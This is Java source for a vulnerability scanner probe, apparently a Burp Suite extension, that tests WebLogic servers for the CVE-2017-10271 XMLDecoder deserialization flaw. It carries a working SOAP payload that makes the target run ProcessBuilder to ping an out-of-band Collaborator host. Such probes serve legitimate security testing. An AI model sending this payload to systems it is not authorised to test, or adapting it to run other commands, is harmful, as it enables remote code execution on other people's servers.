package probes;

import burp.*;

import java.util.Base64;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class CVE_2017_10271 extends Probe {
    private static final String NAME = "CVE-2017-10271";
    private static final String SEVERITY = "High";
    private static String detail = "WebLogic has a deserialization vulnerability in XMLDecoder, you can send payload to target server via SOAP protocol!";

    @Override
    public IScanIssue check(IHttpRequestResponse requestResponse) {
        String targetPath = "/wls-wsat/CoordinatorPortType";
        String pollPayload = Utilities.collaborator.generatePayload(true);
        boolean vulnerable = false;
        String payload = "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">\n" +
                         "  <soapenv:Header>\n" +
                         "    <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">\n" +
                         "      <java>\n" +
                         "        <void class=\"java.lang.ProcessBuilder\">\n" +
                         "          <array class=\"java.lang.String\" length=\"2\">\n" +
                         "            <void index=\"0\">\n" +
                         "              <string>/usr/sbin/ping</string>\n" +
                         "            </void>\n" +
                         "            <void index=\"1\">\n" +
                         "              <string>" + pollPayload + "</string>\n" +
                         "            </void>\n" +
                         "          </array>\n" +
                         "          <void method=\"start\"/>\n" +
                         "        </void>\n" +
                         "      </java>\n" +
                         "    </work:WorkContext>\n" +
                         "  </soapenv:Header>\n" +
                         "  <soapenv:Body/>\n" +
                         "</soapenv:Envelope>";

        // post request
        IHttpRequestResponse checkReqResp = sendSOAP(requestResponse, targetPath, payload);
        String respText = Utilities.helpers.bytesToString(checkReqResp.getResponse());

        for (IBurpCollaboratorInteraction interaction : Utilities.collaborator.fetchCollaboratorInteractionsFor(pollPayload)) {
            byte[] rawQuery = Base64.getDecoder().decode(interaction.getProperty("raw_query").getBytes());
            if (rawQuery.length > 0) {
                Utilities.out.println(new String(rawQuery));
            }

            detail = detail + "<br/>"
                    + "Receive a " + interaction.getProperty("type")
                    + " query from " + interaction.getProperty("client_ip")
                    + " at " + interaction.getProperty("time_stamp");

            vulnerable = true;
        }

        if (vulnerable) {
            return new WebLogicIssue(checkReqResp, NAME, detail, SEVERITY);
        } else return null;
    }
}
